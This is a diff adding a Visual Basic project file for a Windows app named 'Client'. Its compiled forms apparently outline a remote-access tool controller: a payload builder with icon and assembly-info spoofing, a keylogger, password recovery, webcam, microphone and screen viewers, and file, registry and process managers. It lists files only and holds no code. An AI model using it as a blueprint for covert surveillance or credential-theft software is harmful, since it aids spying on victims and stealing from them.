@@ -1,0 +1,1281 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">x86</Platform>
+    <ProductVersion>
+    </ProductVersion>
+    <SchemaVersion>2.0</SchemaVersion>
+    <ProjectGuid>{18E894CD-C666-4DC6-96B5-69368C58EE9F}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <StartupObject>Client.My.MyApplication</StartupObject>
+    <RootNamespace>Client</RootNamespace>
+    <AssemblyName>Client</AssemblyName>
+    <FileAlignment>512</FileAlignment>
+    <MyType>WindowsForms</MyType>
+    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
+    <TargetFrameworkProfile>
+    </TargetFrameworkProfile>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <DefineDebug>true</DefineDebug>
+    <DefineTrace>true</DefineTrace>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DocumentationFile>Client.xml</DocumentationFile>
+    <NoWarn>
+    </NoWarn>
+    <WarningsAsErrors>41999,42016,42017,42018,42019,42020,42021,42022,42032,42036</WarningsAsErrors>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <DefineDebug>false</DefineDebug>
+    <DefineTrace>true</DefineTrace>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DocumentationFile>Client.xml</DocumentationFile>
+    <NoWarn>
+    </NoWarn>
+    <UseVSHostingProcess>true</UseVSHostingProcess>
+    <WarningsAsErrors>41999,42016,42017,42018,42019,42020,42021,42022,42032,42036</WarningsAsErrors>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionExplicit>On</OptionExplicit>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionCompare>Binary</OptionCompare>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionStrict>On</OptionStrict>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionInfer>On</OptionInfer>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>Untitled.ico</ApplicationIcon>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Debug|AnyCPU'">
+    <PlatformTarget>x86</PlatformTarget>
+    <OutputPath>bin\Debug\</OutputPath>
+    <WarningsAsErrors>41999,42016,42017,42018,42019,42020,42021,42022,42032,42036</WarningsAsErrors>
+    <Optimize>true</Optimize>
+    <UseVSHostingProcess>false</UseVSHostingProcess>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Release|AnyCPU'">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <OutputPath>bin\Release\</OutputPath>
+    <UseVSHostingProcess>true</UseVSHostingProcess>
+    <WarningsAsErrors>41999,42016,42017,42018,42019,42020,42021,42022,42032,42036</WarningsAsErrors>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Mono.Cecil, Version=0.9.5.0, Culture=neutral, PublicKeyToken=0738eb9f132ed756, processorArchitecture=MSIL">
+      <SpecificVersion>False</SpecificVersion>
+      <HintPath>..\..\..\Reverse Engineering\DnSpy\Mono.Cecil.dll</HintPath>
+    </Reference>
+    <Reference Include="PresentationCore" />
+    <Reference Include="PresentationFramework" />
+    <Reference Include="System" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Deployment" />
+    <Reference Include="System.Design" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Messaging" />
+    <Reference Include="System.ServiceProcess" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xaml" />
+    <Reference Include="System.Xml" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="UIAutomationProvider" />
+    <Reference Include="Vestris.ResourceLib">
+      <HintPath>..\..\..\Vestris.ResourceLib.dll</HintPath>
+    </Reference>
+    <Reference Include="WindowsBase" />
+    <Reference Include="WindowsFormsIntegration" />
+  </ItemGroup>
+  <ItemGroup>
+    <Import Include="Microsoft.VisualBasic" />
+    <Import Include="System" />
+    <Import Include="System.Collections" />
+    <Import Include="System.Collections.Generic" />
+    <Import Include="System.Data" />
+    <Import Include="System.Drawing" />
+    <Import Include="System.Diagnostics" />
+    <Import Include="System.Windows.Forms" />
+    <Import Include="System.Linq" />
+    <Import Include="System.Xml.Linq" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="AboutAndCredits.Designer.vb">
+      <DependentUpon>AboutAndCredits.vb</DependentUpon>
+    </Compile>
+    <Compile Include="AboutAndCredits.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ApplicationSettings.vb" />
+    <Compile Include="Builder.Designer.vb">
+      <DependentUpon>Builder.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Builder.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="BuilderAdvancedSettings.Designer.vb">
+      <DependentUpon>BuilderAdvancedSettings.vb</DependentUpon>
+    </Compile>
+    <Compile Include="BuilderAdvancedSettings.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="BuilderAssemblyInformation.Designer.vb">
+      <DependentUpon>BuilderAssemblyInformation.vb</DependentUpon>
+    </Compile>
+    <Compile Include="BuilderAssemblyInformation.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="BuilderQuerySpeed.Designer.vb">
+      <DependentUpon>BuilderQuerySpeed.vb</DependentUpon>
+    </Compile>
+    <Compile Include="BuilderQuerySpeed.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Clipboard.Designer.vb">
+      <DependentUpon>Clipboard.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Clipboard.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Downloadmanager.Designer.vb">
+      <DependentUpon>Downloadmanager.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Downloadmanager.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Filemanager.Designer.vb">
+      <DependentUpon>Filemanager.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Filemanager.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FilemanagerCreateFolder.Designer.vb">
+      <DependentUpon>FilemanagerCreateFolder.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FilemanagerCreateFolder.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FilemanagerFileinfo.Designer.vb">
+      <DependentUpon>FilemanagerFileinfo.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FilemanagerFileinfo.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FilemanagerRenameFile.Designer.vb">
+      <DependentUpon>FilemanagerRenameFile.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FilemanagerRenameFile.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FilemanagerRenameFolder.Designer.vb">
+      <DependentUpon>FilemanagerRenameFolder.vb</DependentUpon>
+    </Compile>
+    <Compile Include="FilemanagerRenameFolder.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Graph.vb">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="IconChanger.vb" />
+    <Compile Include="IconComboBox.vb">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="Keylogger.Designer.vb">
+      <DependentUpon>Keylogger.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Keylogger.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="License.vb">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="Main.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Main.Designer.vb">
+      <DependentUpon>Main.vb</DependentUpon>
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="MessageBoxManager.Designer.vb">
+      <DependentUpon>MessageBoxManager.vb</DependentUpon>
+    </Compile>
+    <Compile Include="MessageBoxManager.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Microphone.Designer.vb">
+      <DependentUpon>Microphone.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Microphone.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="MiscFunctions.Designer.vb">
+      <DependentUpon>MiscFunctions.vb</DependentUpon>
+    </Compile>
+    <Compile Include="MiscFunctions.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="My Project\AssemblyInfo.vb" />
+    <Compile Include="My Project\Application.Designer.vb">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Application.myapp</DependentUpon>
+    </Compile>
+    <Compile Include="My Project\Resources.Designer.vb">
+      <AutoGen>True</AutoGen>
+      <DesignTime>True</DesignTime>
+      <DependentUpon>Resources.resx</DependentUpon>
+    </Compile>
+    <Compile Include="My Project\Settings.Designer.vb">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+    <Compile Include="Networkviewer.Designer.vb">
+      <DependentUpon>Networkviewer.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Networkviewer.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="NotificationGlobalMessage.Designer.vb">
+      <DependentUpon>NotificationGlobalMessage.vb</DependentUpon>
+    </Compile>
+    <Compile Include="NotificationGlobalMessage.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Notification.Designer.vb">
+      <DependentUpon>Notification.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Notification.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="NotificationTheme.vb">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="PasswordRecovery.Designer.vb">
+      <DependentUpon>PasswordRecovery.vb</DependentUpon>
+    </Compile>
+    <Compile Include="PasswordRecovery.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Processmanager.Designer.vb">
+      <DependentUpon>Processmanager.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Processmanager.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ProcessmanagerModules.Designer.vb">
+      <DependentUpon>ProcessmanagerModules.vb</DependentUpon>
+    </Compile>
+    <Compile Include="ProcessmanagerModules.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ProcessmanagerStartProcess.Designer.vb">
+      <DependentUpon>ProcessmanagerStartProcess.vb</DependentUpon>
+    </Compile>
+    <Compile Include="ProcessmanagerStartProcess.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="RandomPool.vb">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="Registrymanager.Designer.vb">
+      <DependentUpon>Registrymanager.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Registrymanager.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="RegistrymanagerCreateValue.Designer.vb">
+      <DependentUpon>RegistrymanagerCreateValue.vb</DependentUpon>
+    </Compile>
+    <Compile Include="RegistrymanagerCreateValue.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="RegistrymanagerModifyValue.Designer.vb">
+      <DependentUpon>RegistrymanagerModifyValue.vb</DependentUpon>
+    </Compile>
+    <Compile Include="RegistrymanagerModifyValue.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Screenviewer.Designer.vb">
+      <DependentUpon>Screenviewer.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Screenviewer.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="SeperatorControl.vb">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="Serverinformation.Designer.vb">
+      <DependentUpon>Serverinformation.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Serverinformation.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Servicemanager.Designer.vb">
+      <DependentUpon>Servicemanager.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Servicemanager.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Settings.Designer.vb">
+      <DependentUpon>Settings.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Settings.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Softwaremanager.Designer.vb">
+      <DependentUpon>Softwaremanager.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Softwaremanager.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="StartupMonitor.Designer.vb">
+      <DependentUpon>StartupMonitor.vb</DependentUpon>
+    </Compile>
+    <Compile Include="StartupMonitor.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Systeminformation.Designer.vb">
+      <DependentUpon>Systeminformation.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Systeminformation.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Waiting.Designer.vb">
+      <DependentUpon>Waiting.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Waiting.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Webcamviewer.Designer.vb">
+      <DependentUpon>Webcamviewer.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Webcamviewer.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Win32.vb" />
+    <Compile Include="Windowmanager.Designer.vb">
+      <DependentUpon>Windowmanager.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Windowmanager.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="WindowmanagerTitleChanger.Designer.vb">
+      <DependentUpon>WindowmanagerTitleChanger.vb</DependentUpon>
+    </Compile>
+    <Compile Include="WindowmanagerTitleChanger.vb">
+      <SubType>Form</SubType>
+    </Compile>
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="AboutAndCredits.resx">
+      <DependentUpon>AboutAndCredits.vb</DependentUpon>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Builder.resx">
+      <DependentUpon>Builder.vb</DependentUpon>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <EmbeddedResource Include="BuilderAdvancedSettings.resx">
+      <DependentUpon>BuilderAdvancedSettings.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="BuilderAssemblyInformation.resx">
+      <DependentUpon>BuilderAssemblyInformation.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="BuilderQuerySpeed.resx">
+      <DependentUpon>BuilderQuerySpeed.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Clipboard.resx">
+      <DependentUpon>Clipboard.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Downloadmanager.resx">
+      <DependentUpon>Downloadmanager.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Filemanager.resx">
+      <DependentUpon>Filemanager.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FilemanagerCreateFolder.resx">
+      <DependentUpon>FilemanagerCreateFolder.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FilemanagerFileinfo.resx">
+      <DependentUpon>FilemanagerFileinfo.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FilemanagerRenameFile.resx">
+      <DependentUpon>FilemanagerRenameFile.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FilemanagerRenameFolder.resx">
+      <DependentUpon>FilemanagerRenameFolder.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Keylogger.resx">
+      <DependentUpon>Keylogger.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Main.resx">
+      <DependentUpon>Main.vb</DependentUpon>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <EmbeddedResource Include="MessageBoxManager.resx">
+      <DependentUpon>MessageBoxManager.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Microphone.resx">
+      <DependentUpon>Microphone.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="MiscFunctions.resx">
+      <DependentUpon>MiscFunctions.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="My Project\Resources.resx">
+      <Generator>VbMyResourcesResXFileCodeGenerator</Generator>
+      <CustomToolNamespace>My.Resources</CustomToolNamespace>
+      <SubType>Designer</SubType>
+      <LastGenOutput>Resources.Designer.vb</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Networkviewer.resx">
+      <DependentUpon>Networkviewer.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="NotificationGlobalMessage.resx">
+      <DependentUpon>NotificationGlobalMessage.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Notification.resx">
+      <DependentUpon>Notification.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="PasswordRecovery.resx">
+      <DependentUpon>PasswordRecovery.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Processmanager.resx">
+      <DependentUpon>Processmanager.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ProcessmanagerModules.resx">
+      <DependentUpon>ProcessmanagerModules.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ProcessmanagerStartProcess.resx">
+      <DependentUpon>ProcessmanagerStartProcess.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Registrymanager.resx">
+      <DependentUpon>Registrymanager.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="RegistrymanagerCreateValue.resx">
+      <DependentUpon>RegistrymanagerCreateValue.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="RegistrymanagerModifyValue.resx">
+      <DependentUpon>RegistrymanagerModifyValue.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Screenviewer.resx">
+      <DependentUpon>Screenviewer.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Serverinformation.resx">
+      <DependentUpon>Serverinformation.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Servicemanager.resx">
+      <DependentUpon>Servicemanager.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Settings.resx">
+      <DependentUpon>Settings.vb</DependentUpon>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Softwaremanager.resx">
+      <DependentUpon>Softwaremanager.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="StartupMonitor.resx">
+      <DependentUpon>StartupMonitor.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Systeminformation.resx">
+      <DependentUpon>Systeminformation.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Waiting.resx">
+      <DependentUpon>Waiting.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Webcamviewer.resx">
+      <DependentUpon>Webcamviewer.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Windowmanager.resx">
+      <DependentUpon>Windowmanager.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="WindowmanagerTitleChanger.resx">
+      <DependentUpon>WindowmanagerTitleChanger.vb</DependentUpon>
+    </EmbeddedResource>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.config" />
+    <None Include="My Project\Application.myapp">
+      <Generator>MyApplicationCodeGenerator</Generator>
+      <LastGenOutput>Application.Designer.vb</LastGenOutput>
+    </None>
+    <None Include="My Project\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <CustomToolNamespace>My</CustomToolNamespace>
+      <LastGenOutput>Settings.Designer.vb</LastGenOutput>
+    </None>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ad.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ae.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\af.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ag.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ai.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\al.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\am.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\an.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ao.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ar.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\as.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\at.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\au.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\aw.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ax.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\az.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ba.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\bb.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\bd.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\be.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\bf.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\bg.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\bh.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\bi.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\bj.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\bm.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\bn.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\bo.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\br.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\bs.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\bt.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\bv.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\bw.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\by.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\bz.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ca.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\catalonia.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\cc.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\cd.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\cf.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\cg.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ch.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ci.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ck.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\cl.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\cm.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\cn.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\co.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\cr.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\cs.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\cu.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\cv.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\cx.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\cy.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\cz.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\de.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\default.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\dj.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\dk.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\dm.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\do.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\dz.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ec.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ee.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\eg.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\eh.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\england.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\er.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\es.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\et.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\fam.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\fi.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\fj.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\fk.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\fm.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\fo.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\fr.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ga.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\gb.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\gd.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ge.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\gf.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\gh.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\gi.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\gl.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\gm.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\gn.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\gp.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\gq.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\gr.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\gs.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\gt.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\gu.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\gw.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\gy.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\hk.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\hm.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\hn.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\hr.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ht.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\hu.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\id.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ie.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\il.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\in.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\io.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\iq.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ir.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\is.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\it.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\jm.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\jo.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\jp.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ke.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\kg.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\kh.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\ki.png" />
+  </ItemGroup>
+  <ItemGroup>
